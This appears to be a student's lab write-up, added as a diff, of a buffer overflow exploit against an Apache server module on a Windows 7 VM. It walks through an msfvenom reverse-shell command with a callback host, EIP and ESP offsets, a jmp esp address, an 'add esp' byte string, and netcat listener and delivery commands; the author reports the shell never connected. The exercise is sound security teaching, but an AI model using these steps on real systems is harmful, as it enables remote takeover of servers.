@@ -1,0 +1,25 @@
+1. The very first step and easiest step to do is to get the reverse shell code from Metasploit. By using the command msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.126.129 LPORT=8080 -b '\x00\x0a\x0d\xff\x20' -e x86/alpha_mixed -f perl. This produced the output in the textfile labelled reverseSCH.txt.
+2. Now that we have the shell code, we need to figure out where the EIP is located, or the address so we can know where we need to overwrite it. I ran the command msf-pattern_create -l 5000 to generate 5000 nonrepeating characters, so we can know where in the string the value of the eip is overwritten. 
+3. Using one of the scripts given to us, we can put in that pattern we got for the buffer, this script will be labelled payload.pl and the pattern will be labelled payload.txt. I was having trouble with string length in perl, so I had the script read from the text file.
+4. Next we need to start the Apache server so on the Windows 7 VM we need to navigate to the bottom right of the screen and press the up arrow for other devices. There should be a logo for the Apache server, and from there we want to open that up.
+5. Now we want to first press stop, then press restart on the side of the application. To verify it is running you can open a console and enter the command ipconfig. Use the IPv4 address and put it in a web address with port 80 so for example 192.168.XXX.XXX:80. It should bring up an Apache website.
+6. Now that we have verified Apache is running, we need to run WinDBG as an administrator. It should bring up a big blank box, so we need to go up to the top and select File -> Attach to a Process -> and scroll to the bottom to find the Apache server process. Once attached type g in the command line to start the Debuggee.To avoid any issues, disable the windows firewall.
+7. Once everything is setup, I will be running a second script to get some information from WinDBG. I will be running the script labelled payload2.pl. The command is perl payload2.pl | nc <your IP> 80
+8. The information on WinDBG should give us the eip whichi in this case is: 67463467. In the first screenshot, it should have an example of what it should look like. 
+9. From there we run the command msf-pattern_offset -q 0x67463467, and find that there is an exact match at 4093, so we now have the distance to the EIP. Next we need the address of the esp. To do so, in the WinDBG we can use the command dc esp and find the address to be: 36674635. We can run another pattern offset command to find a match at 4097. That means there is only a 4 byte gap between the two. This helps in the creation of the final script because we will not have to add anything between the address and the add ESP, -200 instruction.
+10. However we now need to find a fixed address that contains an ff e4 or jump 4 command. Thankfully WindDBG has a tool for this. Within it, enter .load narly into the console. From here enter the command !nmod to see the shared libraries that might have something we are looking for. We need to find a library with no protections, and the general command to help us would be 0xlibrarystartaddress 0xlibraryendaddress ff e4. When we look in the Apache library we can see one appreance of ff e4, but the address contains a null terminator (\x00) so we don’t
+want to use that one. However, checking the library underneath it (mod_wl_20) we see two
+appearances of ff e4 however, we will just use the first address (1005bc0f). you can see in this in the second screenshot.
+11. To get the add ESP, -200 into it’s string literal, just use an online x86 assembler/disassembler.
+Using one I found I came up with: \x81\xC4\x38\xFF\xFF\xFF. This is to make sure our ESP points to a
+location within the NOP sled.
+12. Now that we have done this we are ready to create our script to attack the Apache server.The structure of the script I used is in payload2.pl 
+13. Before sending the attack in another window of the terminal, we want to set
+up a listener using the command nc -l -p PORTNUM -nvv , in our case the PORTNUM is 8080 as
+mentioned above. This will start a local daemon on the machine that accepts incoming
+connection at PORTNUM.
+NOTE!!! Before we attack the Apache server again, on WinDbg press Debug -> Stop Debugging. If the
+program crashes, just use the same steps above to reset it up and start debugging.
+14. Now for the final attack, run perl payload2.pl | nc 192.168.126.130 80 again with
+the listener set up in another terminal. Once running this, if we go to the listener terminal, we
+should have a shell. This is as far as I got, I couldn't get a successful connection to the Apache server and I am not too sure why. My steps are laid in detail above.
